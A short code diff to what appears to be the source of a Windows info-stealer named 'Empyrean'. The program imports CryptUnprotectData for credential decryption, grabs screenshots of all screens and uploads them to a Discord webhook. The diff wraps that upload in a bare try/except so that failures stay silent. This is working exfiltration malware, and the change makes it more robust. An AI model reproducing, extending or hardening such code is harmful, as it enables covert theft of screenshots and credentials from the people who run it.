@@ -18,7 +18,6 @@ from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-
 def main() -> None:
     debug()
     
@@ -499,7 +498,10 @@ class system():
         ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save("screenshot.png")
         embed.set_image(url="attachment://screenshot.png")
         
-        webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+        try:
+            webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+        except:
+            pass
         
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
